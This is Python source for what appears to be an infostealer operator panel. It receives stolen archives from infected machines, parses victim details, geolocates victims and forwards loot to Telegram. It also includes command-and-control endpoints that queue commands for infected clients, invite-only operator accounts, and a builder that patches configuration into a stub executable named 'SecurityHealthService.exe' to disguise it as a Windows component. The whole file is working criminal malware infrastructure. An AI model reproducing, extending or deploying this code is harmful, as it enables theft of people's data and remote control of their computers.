import os
import secrets
import sqlite3
import time
import zipfile
import requests
from datetime import datetime, timedelta
from functools import wraps
from flask import Flask, request, jsonify, send_from_directory, send_file, session
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename

app = Flask(__name__, static_folder='public')

# Paths setup
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
DATA_DIR = '/data' if os.path.isdir('/data') else BASE_DIR
DB_PATH = os.path.join(DATA_DIR, 'database.db')
UPLOADS_DIR = os.path.join(DATA_DIR, 'uploads')
LOGS_DIR = os.path.join(UPLOADS_DIR, 'logs')
SCREENSHOTS_DIR = os.path.join(UPLOADS_DIR, 'screenshots')

for d in [LOGS_DIR, SCREENSHOTS_DIR]:
    os.makedirs(d, exist_ok=True)

# Flask session secret key (persistent across restarts)
SECRET_KEY_FILE = os.path.join(DATA_DIR, '.flask_secret')
if os.path.exists(SECRET_KEY_FILE):
    with open(SECRET_KEY_FILE, 'r') as f:
        app.secret_key = f.read().strip()
else:
    app.secret_key = secrets.token_hex(32)
    with open(SECRET_KEY_FILE, 'w') as f:
        f.write(app.secret_key)

app.permanent_session_lifetime = timedelta(days=30)
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB max upload

# --- Database ---
def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as db:
        db.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                role TEXT DEFAULT 'user',
                api_key TEXT UNIQUE NOT NULL,
                is_banned INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        db.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                username TEXT,
                hostname TEXT,
                os TEXT,
                cpu TEXT,
                ram INTEGER,
                ip TEXT,
                date_time TEXT,
                file_count INTEGER,
                zip_filename TEXT,
                has_screenshot INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        # Migrate: add columns if missing
        cursor = db.execute("PRAGMA table_info(logs)")
        columns = [row['name'] for row in cursor.fetchall()]
        if 'country_code' not in columns:
            db.execute("ALTER TABLE logs ADD COLUMN country_code TEXT")
        if 'user_id' not in columns:
            db.execute("ALTER TABLE logs ADD COLUMN user_id INTEGER")

        db.execute('''
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        ''')
        db.execute('''
            CREATE TABLE IF NOT EXISTS invites (
                code TEXT PRIMARY KEY,
                created_by INTEGER,
                used_by INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                used_at TIMESTAMP
            )
        ''')

        db.execute('''
            CREATE TABLE IF NOT EXISTS clients (
                client_id TEXT PRIMARY KEY,
                user_id INTEGER,
                hostname TEXT,
                username TEXT,
                ip TEXT,
                last_heartbeat TIMESTAMP,
                pending_command TEXT
            )
        ''')

        for k, v in [
            ('tg_forward_enabled', 'false'), ('tg_bot_token', ''), ('tg_chat_id', ''),
            ('active_bg_theme', 'theme-default'), ('bg_blur_value', '15'), ('custom_bg_path', '')
        ]:
            db.execute('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', (k, v))
        db.commit()

init_db()

# --- Auth helpers ---
def get_current_user():
    user_id = session.get('user_id')
    if not user_id:
        return None
    with get_db() as db:
        user = db.execute('SELECT * FROM users WHERE id = ?', (user_id,)).fetchone()
    if user and user['is_banned']:
        session.clear()
        return None
    return user

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        user = get_current_user()
        if not user:
            return jsonify({'error': 'Unauthorized'}), 401
        request.current_user = user
        return f(*args, **kwargs)
    return decorated

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        user = get_current_user()
        if not user:
            return jsonify({'error': 'Unauthorized'}), 401
        if user['role'] != 'admin':
            return jsonify({'error': 'Admin access required'}), 403
        request.current_user = user
        return f(*args, **kwargs)
    return decorated

# --- Helpers ---
def parse_info_text(content):
    info = {
        'username': 'Unknown', 'hostname': 'Unknown', 'os': 'Unknown',
        'cpu': 'Unknown', 'ram': 0, 'ip': 'Unknown', 'date_time': ''
    }
    for line in content.split('\n'):
        line = line.strip()
        if line.startswith('User: '): info['username'] = line[6:].strip()
        elif line.startswith('Machine: '): info['hostname'] = line[9:].strip()
        elif line.startswith('OS: '): info['os'] = line[4:].strip()
        elif line.startswith('CPU Name: '): info['cpu'] = line[10:].strip()
        elif line.startswith('RAM Total (MB): '):
            try: info['ram'] = int(line[16:].strip())
            except: pass
        elif line.startswith('Internal IP: '):
            val = line[13:].strip()
            if info['ip'] in ['Unknown', 'unavailable', '127.0.0.1', '::1']:
                info['ip'] = val
        elif line.startswith('IP: '): info['ip'] = line[4:].strip()
        elif line.startswith('Now: '): info['date_time'] = line[5:].strip()
    return info

def get_country_code(ip):
    if not ip or ip in ['127.0.0.1', '::1', 'Unknown', 'unavailable']:
        return ''
    try:
        r = requests.get(f"https://ip2c.org/{ip}", timeout=3)
        if r.status_code == 200:
            parts = r.text.split(';')
            if len(parts) >= 2 and parts[0] == '1':
                return parts[1]
    except Exception as e:
        print(f"[GeoIP] Error: {e}")
    return ''

def forward_to_telegram(zip_path, filename, info):
    try:
        with get_db() as db:
            enabled = db.execute('SELECT value FROM settings WHERE key = ?', ('tg_forward_enabled',)).fetchone()
            if not enabled or enabled['value'] != 'true':
                return
            token = db.execute('SELECT value FROM settings WHERE key = ?', ('tg_bot_token',)).fetchone()
            chat_id = db.execute('SELECT value FROM settings WHERE key = ?', ('tg_chat_id',)).fetchone()

        if not token or not token['value'] or not chat_id or not chat_id['value']:
            return

        ram_str = f"{round(info['ram'] / 1024)} GB" if info['ram'] >= 1024 else (f"{info['ram']} MB" if info['ram'] > 0 else "Unknown")
        caption = (
            f"New Log Received!\n\n"
            f"User: {info['username']}\n"
            f"Machine: {info['hostname']}\n"
            f"IP: {info['ip']}\n"
            f"OS: {info['os']}\n"
            f"RAM: {ram_str}\n"
            f"Time: {info['date_time'] or datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )

        url = f"https://api.telegram.org/bot{token['value']}/sendDocument"
        with open(zip_path, 'rb') as f:
            files = {'document': (filename, f, 'application/zip')}
            data = {'chat_id': chat_id['value'], 'caption': caption, 'parse_mode': 'HTML'}
            requests.post(url, files=files, data=data, timeout=30)
    except Exception as e:
        print(f"[TG Forward] Error: {e}")

# ===== AUTH ROUTES =====

@app.route('/api/auth/check')
def auth_check():
    with get_db() as db:
        user_count = db.execute('SELECT COUNT(*) FROM users').fetchone()[0]
    if user_count == 0:
        return jsonify({'authenticated': False, 'needsSetup': True})
    user = get_current_user()
    if user:
        return jsonify({
            'authenticated': True,
            'user': {
                'id': user['id'],
                'username': user['username'],
                'role': user['role'],
                'api_key': user['api_key']
            }
        })
    return jsonify({'authenticated': False, 'needsSetup': False})

@app.route('/api/auth/register', methods=['POST'])
def auth_register():
    data = request.json
    username = (data.get('username') or '').strip()
    password = data.get('password') or ''
    invite_code = (data.get('invite_code') or '').strip()

    if not username or len(username) < 3:
        return jsonify({'error': 'Username must be at least 3 characters'}), 400
    if len(password) < 4:
        return jsonify({'error': 'Password must be at least 4 characters'}), 400

    api_key = secrets.token_hex(16)

    with get_db() as db:
        user_count = db.execute('SELECT COUNT(*) FROM users').fetchone()[0]
        is_first_user = user_count == 0

        if not is_first_user:
            if not invite_code:
                return jsonify({'error': 'Invitation code is required'}), 400
            invite = db.execute('SELECT * FROM invites WHERE code = ? AND used_by IS NULL', (invite_code,)).fetchone()
            if not invite:
                return jsonify({'error': 'Invalid or already used invitation code'}), 403

        role = 'admin' if is_first_user else 'user'

        existing = db.execute('SELECT id FROM users WHERE username = ?', (username,)).fetchone()
        if existing:
            return jsonify({'error': 'Username already taken'}), 400

        password_hash = generate_password_hash(password)
        cursor = db.execute(
            'INSERT INTO users (username, password_hash, role, api_key) VALUES (?, ?, ?, ?)',
            (username, password_hash, role, api_key)
        )
        user_id = cursor.lastrowid

        if not is_first_user:
            db.execute('UPDATE invites SET used_by = ?, used_at = CURRENT_TIMESTAMP WHERE code = ?', (user_id, invite_code))

        db.commit()

    if not get_current_user():
        session.permanent = True
        session['user_id'] = user_id

    return jsonify({
        'success': True,
        'user': {'id': user_id, 'username': username, 'role': role, 'api_key': api_key}
    })

@app.route('/api/auth/login', methods=['POST'])
def auth_login():
    data = request.json
    username = (data.get('username') or '').strip()
    password = data.get('password') or ''
    remember = data.get('remember', False)

    with get_db() as db:
        user = db.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()

    if not user or not check_password_hash(user['password_hash'], password):
        return jsonify({'error': 'Invalid username or password'}), 401

    if user['is_banned']:
        return jsonify({'error': 'Your account has been banned'}), 403

    session.permanent = bool(remember)
    session['user_id'] = user['id']

    return jsonify({
        'success': True,
        'user': {
            'id': user['id'],
            'username': user['username'],
            'role': user['role'],
            'api_key': user['api_key']
        }
    })

@app.route('/api/auth/logout', methods=['POST'])
def auth_logout():
    session.clear()
    return jsonify({'success': True})

# ===== STATIC ROUTES =====

@app.route('/')
def index():
    return send_from_directory(app.static_folder, 'index.html')

@app.route('/login')
def login_page():
    return send_from_directory(app.static_folder, 'login.html')

@app.route('/uploads/<path:path>')
def serve_uploads(path):
    return send_from_directory(UPLOADS_DIR, path)

@app.route('/<path:path>')
def static_proxy(path):
    return send_from_directory(app.static_folder, path)

# ===== UPLOAD (public, keyed by api_key) =====

@app.route('/api/upload', methods=['POST'])
def upload_log():
    try:
        api_key = request.headers.get('x-panel-key') or request.form.get('secret_key') or ''
        api_key = api_key.strip()

        owner_id = None
        with get_db() as db:
            if api_key:
                owner = db.execute('SELECT id, is_banned FROM users WHERE api_key = ?', (api_key,)).fetchone()
                if owner:
                    if owner['is_banned']:
                        return jsonify({'error': 'Account banned'}), 403
                    owner_id = owner['id']
                else:
                    return jsonify({'error': 'Invalid API key'}), 403
            else:
                return jsonify({'error': 'API key required'}), 403

        file = request.files.get('document')
        if not file:
            return jsonify({'error': 'No file uploaded'}), 400

        timestamp = int(time.time() * 1000)
        orig_filename = secure_filename(file.filename) or 'Stealer.zip'
        base, ext = os.path.splitext(orig_filename)
        filename = f"{base}_{timestamp}{ext}"
        zip_path = os.path.join(LOGS_DIR, filename)
        file.save(zip_path)

        info = {
            'username': 'Unknown', 'hostname': 'Unknown', 'os': 'Unknown',
            'cpu': 'Unknown', 'ram': 0,
            'ip': request.remote_addr or 'Unknown',
            'date_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        has_screenshot = 0
        file_count = 0

        with zipfile.ZipFile(zip_path, 'r') as zf:
            namelist = zf.namelist()
            file_count = len(namelist)

            if 'Information.txt' in namelist:
                with zf.open('Information.txt') as info_file:
                    content = info_file.read().decode('utf-8', errors='ignore')
                    info = parse_info_text(content)
                    if info['ip'] in ['unavailable', '127.0.0.1', '::1', 'Unknown']:
                        info['ip'] = request.remote_addr or 'Unknown'

            if 'screenshot.jpg' in namelist:
                screenshot_filename = f"{base}_{timestamp}.jpg"
                with open(os.path.join(SCREENSHOTS_DIR, screenshot_filename), 'wb') as sf:
                    sf.write(zf.read('screenshot.jpg'))
                has_screenshot = 1

        country_code = get_country_code(info['ip'])

        with get_db() as db:
            existing = db.execute(
                'SELECT id, zip_filename, has_screenshot FROM logs WHERE username = ? AND hostname = ? AND user_id = ?',
                (info['username'], info['hostname'], owner_id)
            ).fetchone()

            if existing:
                old_zip_path = os.path.join(LOGS_DIR, existing['zip_filename'])
                if os.path.exists(old_zip_path):
                    try: os.remove(old_zip_path)
                    except: pass
                if existing['has_screenshot']:
                    old_base, _ = os.path.splitext(existing['zip_filename'])
                    old_sc_path = os.path.join(SCREENSHOTS_DIR, f"{old_base}.jpg")
                    if os.path.exists(old_sc_path):
                        try: os.remove(old_sc_path)
                        except: pass

                db.execute('''
                    UPDATE logs SET
                        os = ?, cpu = ?, ram = ?, ip = ?, date_time = ?,
                        file_count = ?, zip_filename = ?, has_screenshot = ?, country_code = ?, created_at = CURRENT_TIMESTAMP
                    WHERE id = ?
                ''', (info['os'], info['cpu'], info['ram'], info['ip'], info['date_time'],
                      file_count, filename, has_screenshot, country_code, existing['id']))
                log_id = existing['id']
            else:
                cursor = db.execute('''
                    INSERT INTO logs (user_id, username, hostname, os, cpu, ram, ip, date_time, file_count, zip_filename, has_screenshot, country_code)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (owner_id, info['username'], info['hostname'], info['os'], info['cpu'], info['ram'],
                      info['ip'], info['date_time'], file_count, filename, has_screenshot, country_code))
                log_id = cursor.lastrowid
            db.commit()

        forward_to_telegram(zip_path, filename, info)
        return jsonify({'success': True, 'id': log_id})
    except Exception as e:
        print(f"[API] Upload Error: {e}")
        return jsonify({'error': str(e)}), 500

# ===== STATS (per-user) =====

@app.route('/api/stats')
@login_required
def get_stats():
    try:
        user = request.current_user
        uid = user['id']

        with get_db() as db:
            total_logs = db.execute('SELECT COUNT(*) FROM logs WHERE user_id = ?', (uid,)).fetchone()[0]
            today_str = datetime.now().strftime('%Y-%m-%d') + '%'
            logs_today = db.execute('SELECT COUNT(*) FROM logs WHERE user_id = ? AND created_at LIKE ?', (uid, today_str)).fetchone()[0]
            unique_ips = db.execute('SELECT COUNT(DISTINCT ip) FROM logs WHERE user_id = ?', (uid,)).fetchone()[0]
            os_stats = db.execute('SELECT os, COUNT(*) as count FROM logs WHERE user_id = ? GROUP BY os ORDER BY count DESC LIMIT 5', (uid,)).fetchall()

            os_list = [{'os': r['os'], 'count': r['count']} for r in os_stats]

        return jsonify({
            'totalLogs': total_logs, 'logsToday': logs_today,
            'uniqueIps': unique_ips, 'osStats': os_list
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ===== LOGS (per-user) =====

@app.route('/api/logs')
@login_required
def get_logs():
    try:
        user = request.current_user
        uid = user['id']

        page = int(request.args.get('page', 1))
        limit = int(request.args.get('limit', 15))
        search = request.args.get('search', '')
        offset = (page - 1) * limit

        base_filter = 'user_id = ?'
        base_params = [uid]

        if search:
            like_expr = f"%{search}%"
            search_filter = '(username LIKE ? OR hostname LIKE ? OR os LIKE ? OR ip LIKE ?)'
            search_params = [like_expr] * 4
            where = f' WHERE {base_filter} AND {search_filter}'
            params = base_params + search_params
        else:
            where = f' WHERE {base_filter}'
            params = base_params

        query = f'SELECT * FROM logs{where} ORDER BY id DESC LIMIT ? OFFSET ?'
        count_query = f'SELECT COUNT(*) FROM logs{where}'

        with get_db() as db:
            logs_rows = db.execute(query, params + [limit, offset]).fetchall()
            total = db.execute(count_query, params).fetchone()[0]

        logs = [dict(r) for r in logs_rows]
        return jsonify({
            'logs': logs, 'total': total, 'page': page,
            'totalPages': max(1, (total + limit - 1) // limit)
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/logs/<int:log_id>')
@login_required
def get_log_details(log_id):
    try:
        user = request.current_user

        with get_db() as db:
            log_row = db.execute('SELECT * FROM logs WHERE id = ? AND user_id = ?', (log_id, user['id'])).fetchone()

        if not log_row:
            return jsonify({'error': 'Log not found'}), 404

        log = dict(log_row)

        zip_path = os.path.join(LOGS_DIR, log['zip_filename'])
        if not os.path.exists(zip_path):
            return jsonify({'error': 'ZIP file not found'}), 404

        file_param = request.args.get('file')

        if file_param:
            TEXT_EXTENSIONS = {
                '.txt', '.log', '.json', '.xml', '.csv', '.ini', '.cfg', '.conf',
                '.html', '.htm', '.css', '.js', '.ts', '.py', '.md', '.yaml', '.yml',
                '.toml', '.sql', '.sh', '.bat', '.cmd', '.ps1', '.env', '.gitignore'
            }
            with zipfile.ZipFile(zip_path, 'r') as zf:
                if file_param not in zf.namelist():
                    return jsonify({'error': 'File not found in archive'}), 404
                zinfo = zf.getinfo(file_param)
                _, ext = os.path.splitext(file_param.lower())
                if ext in TEXT_EXTENSIONS or zinfo.file_size < 500000:
                    raw = zf.read(file_param)
                    try:
                        content = raw.decode('utf-8')
                        return jsonify({'type': 'text', 'content': content, 'size': zinfo.file_size})
                    except UnicodeDecodeError:
                        pass
                return jsonify({'type': 'binary', 'size': zinfo.file_size, 'content': None})

        files = []
        with zipfile.ZipFile(zip_path, 'r') as zf:
            for zinfo in zf.infolist():
                files.append({'name': zinfo.filename, 'size': zinfo.file_size})

        return jsonify({'log': log, 'files': files})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/logs/<int:log_id>/download')
@login_required
def download_log(log_id):
    try:
        user = request.current_user

        with get_db() as db:
            log = db.execute('SELECT * FROM logs WHERE id = ? AND user_id = ?', (log_id, user['id'])).fetchone()
        if not log:
            return 'Log not found', 404

        zip_path = os.path.join(LOGS_DIR, log['zip_filename'])
        if not os.path.exists(zip_path):
            return 'ZIP file not found', 404
        return send_file(zip_path, as_attachment=True, download_name=log['zip_filename'])
    except Exception as e:
        return str(e), 500

@app.route('/api/logs/<int:log_id>', methods=['DELETE'])
@login_required
def delete_log(log_id):
    try:
        user = request.current_user

        with get_db() as db:
            log = db.execute('SELECT * FROM logs WHERE id = ? AND user_id = ?', (log_id, user['id'])).fetchone()
            if not log:
                return jsonify({'error': 'Log not found'}), 404

            db.execute('DELETE FROM logs WHERE id = ?', (log_id,))
            db.commit()

        zip_path = os.path.join(LOGS_DIR, log['zip_filename'])
        if os.path.exists(zip_path):
            os.remove(zip_path)
        if log['has_screenshot']:
            base, _ = os.path.splitext(log['zip_filename'])
            sc_path = os.path.join(SCREENSHOTS_DIR, f"{base}.jpg")
            if os.path.exists(sc_path):
                os.remove(sc_path)

        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ===== SETTINGS =====

@app.route('/api/settings')
@login_required
def get_settings():
    try:
        with get_db() as db:
            rows = db.execute('SELECT * FROM settings').fetchall()
        settings = {r['key']: r['value'] for r in rows}
        return jsonify(settings)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/settings', methods=['POST'])
@login_required
def save_settings():
    try:
        data = request.json
        with get_db() as db:
            for key in ['tg_forward_enabled', 'tg_bot_token', 'tg_chat_id', 'active_bg_theme', 'bg_blur_value', 'custom_bg_path']:
                if key in data:
                    db.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (key, str(data[key])))
            db.commit()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/settings/background', methods=['POST'])
@login_required
def upload_background():
    try:
        if 'background' not in request.files:
            return jsonify({'error': 'No file uploaded'}), 400
        file = request.files['background']
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400

        ext = os.path.splitext(secure_filename(file.filename))[1] or '.jpg'
        bg_filename = f"custom_bg_{int(time.time())}{ext}"
        bg_path = os.path.join(UPLOADS_DIR, bg_filename)
        file.save(bg_path)
        db_path_url = f"/uploads/{bg_filename}"

        with get_db() as db:
            db.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ('custom_bg_path', db_path_url))
            db.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ('active_bg_theme', 'theme-custom'))
            db.commit()

        return jsonify({'success': True, 'custom_bg_path': db_path_url})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ===== ADMIN ROUTES =====

@app.route('/api/admin/users')
@admin_required
def admin_get_users():
    try:
        with get_db() as db:
            users = db.execute('''
                SELECT u.id, u.username, u.role, u.api_key, u.is_banned, u.created_at,
                       (SELECT COUNT(*) FROM logs WHERE logs.user_id = u.id) as log_count
                FROM users u ORDER BY u.id ASC
            ''').fetchall()
        return jsonify({'users': [dict(u) for u in users]})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/admin/users/<int:target_id>/ban', methods=['POST'])
@admin_required
def admin_ban_user(target_id):
    try:
        user = request.current_user
        if target_id == user['id']:
            return jsonify({'error': 'Cannot ban yourself'}), 400
        with get_db() as db:
            target = db.execute('SELECT * FROM users WHERE id = ?', (target_id,)).fetchone()
            if not target:
                return jsonify({'error': 'User not found'}), 404
            if target['role'] == 'admin':
                return jsonify({'error': 'Cannot ban another admin'}), 400
            db.execute('UPDATE users SET is_banned = 1 WHERE id = ?', (target_id,))
            db.commit()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/admin/users/<int:target_id>/unban', methods=['POST'])
@admin_required
def admin_unban_user(target_id):
    try:
        with get_db() as db:
            db.execute('UPDATE users SET is_banned = 0 WHERE id = ?', (target_id,))
            db.commit()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/admin/users/<int:target_id>/delete', methods=['DELETE'])
@admin_required
def admin_delete_user(target_id):
    try:
        user = request.current_user
        if target_id == user['id']:
            return jsonify({'error': 'Cannot delete yourself'}), 400
        with get_db() as db:
            target = db.execute('SELECT * FROM users WHERE id = ?', (target_id,)).fetchone()
            if not target:
                return jsonify({'error': 'User not found'}), 404
            if target['role'] == 'admin':
                return jsonify({'error': 'Cannot delete another admin'}), 400
            db.execute('DELETE FROM logs WHERE user_id = ?', (target_id,))
            db.execute('DELETE FROM users WHERE id = ?', (target_id,))
            db.commit()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/admin/users/<int:target_id>/role', methods=['POST'])
@admin_required
def admin_set_role(target_id):
    try:
        data = request.json
        new_role = data.get('role', 'user')
        if new_role not in ('admin', 'user'):
            return jsonify({'error': 'Invalid role'}), 400
        user = request.current_user
        if target_id == user['id']:
            return jsonify({'error': 'Cannot change own role'}), 400
        with get_db() as db:
            db.execute('UPDATE users SET role = ? WHERE id = ?', (new_role, target_id))
            db.commit()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ===== INVITES =====

@app.route('/api/admin/invites', methods=['GET'])
@admin_required
def admin_list_invites():
    with get_db() as db:
        rows = db.execute('''
            SELECT i.code, i.created_at, i.used_at,
                   creator.username as created_by,
                   user.username as used_by
            FROM invites i
            LEFT JOIN users creator ON creator.id = i.created_by
            LEFT JOIN users user ON user.id = i.used_by
            ORDER BY i.created_at DESC
        ''').fetchall()
    return jsonify({'invites': [dict(r) for r in rows]})


@app.route('/api/admin/invites', methods=['POST'])
@admin_required
def admin_create_invite():
    code = secrets.token_urlsafe(12)
    user = request.current_user
    with get_db() as db:
        db.execute('INSERT INTO invites (code, created_by) VALUES (?, ?)', (code, user['id']))
        db.commit()
    return jsonify({'success': True, 'code': code})


@app.route('/api/admin/invites/<code>', methods=['DELETE'])
@admin_required
def admin_delete_invite(code):
    with get_db() as db:
        db.execute('DELETE FROM invites WHERE code = ? AND used_by IS NULL', (code,))
        db.commit()
    return jsonify({'success': True})


# ===== C2 ENDPOINTS =====

@app.route('/api/c2/heartbeat', methods=['POST'])
def c2_heartbeat():
    key = request.headers.get('x-panel-key', '')
    if not key:
        return jsonify({'error': 'unauthorized'}), 401
    with get_db() as db:
        user = db.execute('SELECT id FROM users WHERE api_key = ?', (key,)).fetchone()
        if not user:
            return jsonify({'error': 'unauthorized'}), 401
    owner_id = user['id']

    data = request.json or {}
    client_id = data.get('client_id', '')
    hostname = data.get('hostname', '')
    username = data.get('username', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if not client_id:
        return jsonify({'error': 'missing client_id'}), 400

    with get_db() as db:
        db.execute('''
            INSERT INTO clients (client_id, user_id, hostname, username, ip, last_heartbeat)
            VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT(client_id) DO UPDATE SET
                hostname = excluded.hostname,
                username = excluded.username,
                ip = excluded.ip,
                last_heartbeat = CURRENT_TIMESTAMP
        ''', (client_id, owner_id, hostname, username, ip))
        db.commit()
    return jsonify({'status': 'ok'})


@app.route('/api/c2/command', methods=['GET'])
def c2_get_command():
    key = request.headers.get('x-panel-key', '')
    if not key:
        return jsonify({'error': 'unauthorized'}), 401
    with get_db() as db:
        user = db.execute('SELECT id FROM users WHERE api_key = ?', (key,)).fetchone()
        if not user:
            return jsonify({'error': 'unauthorized'}), 401

    client_id = request.args.get('client_id', '')
    if not client_id:
        return jsonify({'command': ''})

    with get_db() as db:
        row = db.execute('SELECT pending_command FROM clients WHERE client_id = ?', (client_id,)).fetchone()
        if row and row['pending_command']:
            cmd = row['pending_command']
            db.execute('UPDATE clients SET pending_command = NULL WHERE client_id = ?', (client_id,))
            db.commit()
            return jsonify({'command': cmd})
    return jsonify({'command': ''})


@app.route('/api/c2/clients', methods=['GET'])
@login_required
def c2_list_clients():
    user = request.current_user
    with get_db() as db:
        rows = db.execute('SELECT client_id, hostname, username, ip, last_heartbeat, pending_command FROM clients WHERE user_id = ? ORDER BY last_heartbeat DESC', (user['id'],)).fetchall()
    clients = []
    for r in rows:
        clients.append({
            'client_id': r['client_id'],
            'hostname': r['hostname'],
            'username': r['username'],
            'ip': r['ip'],
            'last_heartbeat': r['last_heartbeat'],
            'pending_command': r['pending_command']
        })
    return jsonify(clients)


@app.route('/api/c2/command', methods=['POST'])
@login_required
def c2_send_command():
    user = request.current_user
    data = request.json or {}
    client_id = data.get('client_id', '')
    command = data.get('command', '')
    if not client_id or not command:
        return jsonify({'error': 'missing fields'}), 400

    with get_db() as db:
        client = db.execute('SELECT client_id FROM clients WHERE client_id = ? AND user_id = ?', (client_id, user['id'])).fetchone()
        if not client:
            return jsonify({'error': 'client not found'}), 404
        db.execute('UPDATE clients SET pending_command = ? WHERE client_id = ? AND user_id = ?', (command, client_id, user['id']))
        db.commit()
    return jsonify({'success': True})


# ===== BUILDER =====

@app.route('/api/build', methods=['POST'])
@login_required
def build_client():
    try:
        data = request.json
        delivery = data.get('delivery', 'TELEGRAM')
        bot_token = data.get('botToken', '')
        chat_id = data.get('chatId', '')
        panel_url = data.get('panelUrl', '')
        secret_key = data.get('secretKey', '')

        stub_dir = os.path.join(BASE_DIR, 'stub')
        root_dir = os.path.dirname(BASE_DIR)
        stub_search_paths = [
            os.path.join(stub_dir, 'SecurityHealthService.exe'),
            os.path.join(root_dir, 'Main', 'bin', 'Release', 'net462', 'SecurityHealthService.exe'),
            os.path.join(root_dir, 'Main', 'bin', 'Debug', 'net462', 'SecurityHealthService.exe'),
        ]
        config_search_paths = [
            os.path.join(stub_dir, 'config.json'),
            os.path.join(root_dir, 'Main', 'config.json'),
        ]
        source_dir = os.path.join(root_dir, 'Main')

        stub_path = next((p for p in stub_search_paths if os.path.exists(p)), None)
        config_path = next((p for p in config_search_paths if os.path.exists(p)), None)

        if not stub_path or not config_path:
            return jsonify({'error': 'Stub base templates not found. Run "dotnet build" on the C# solution first!'}), 404

        with open(config_path, 'r', encoding='utf-8') as f:
            old_config = f.read()
        with open(stub_path, 'rb') as f:
            stub_bytes = bytearray(f.read())

        def get_placeholder(config, key):
            search = f'"{key}":"'
            start = config.find(search)
            if start == -1: return ""
            start += len(search)
            end = config.find('"', start)
            return config[start:end]

        def pad_value(val, length):
            if len(val) > length: return val[:length]
            return val.ljust(length, ' ')

        delivery_placeholder = get_placeholder(old_config, 'delivery')
        token_placeholder = get_placeholder(old_config, 'botToken')
        chat_placeholder = get_placeholder(old_config, 'chatId')
        panel_url_placeholder = get_placeholder(old_config, 'panelUrl')
        secret_key_placeholder = get_placeholder(old_config, 'secretKey')

        new_config = (
            old_config
            .replace(delivery_placeholder, pad_value(delivery, len(delivery_placeholder)))
            .replace(token_placeholder, pad_value(bot_token, len(token_placeholder)))
            .replace(chat_placeholder, pad_value(chat_id, len(chat_placeholder)))
            .replace(panel_url_placeholder, pad_value(panel_url, len(panel_url_placeholder)))
            .replace(secret_key_placeholder, pad_value(secret_key, len(secret_key_placeholder)))
        )

        old_config_bytes = old_config.encode('utf-8')
        new_config_bytes = new_config.encode('utf-8')

        if len(old_config_bytes) != len(new_config_bytes):
            return jsonify({'error': 'Configuration padding mismatch'}), 400

        replaced = False
        search_len = len(old_config_bytes)
        for i in range(len(stub_bytes) - search_len + 1):
            if stub_bytes[i:i+search_len] == old_config_bytes:
                stub_bytes[i:i+search_len] = new_config_bytes
                replaced = True
                break

        if not replaced:
            return jsonify({'error': 'Stub binary configuration signature not found'}), 400

        # from polymorph import mutate
        # stub_bytes = mutate(stub_bytes, source_dir=source_dir)

        builds_dir = os.path.join(BASE_DIR, 'public', 'builds')
        os.makedirs(builds_dir, exist_ok=True)
        output_filename = f"build_{datetime.now().strftime('%Y%m%d_%H%M%S')}.exe"
        output_path = os.path.join(builds_dir, output_filename)

        with open(output_path, 'wb') as f:
            f.write(stub_bytes)

        return jsonify({'success': True, 'downloadUrl': f"/api/build/download/{output_filename}"})
    except Exception as e:
        print(f"[BUILDER] Compile Error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/build/download/<filename>')
@login_required
def download_build(filename):
    builds_dir = os.path.join(BASE_DIR, 'public', 'builds')
    path = os.path.join(builds_dir, filename)
    if os.path.exists(path):
        return send_file(path, as_attachment=True, download_name='SecurityHealthService.exe')
    return 'Build file not found', 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
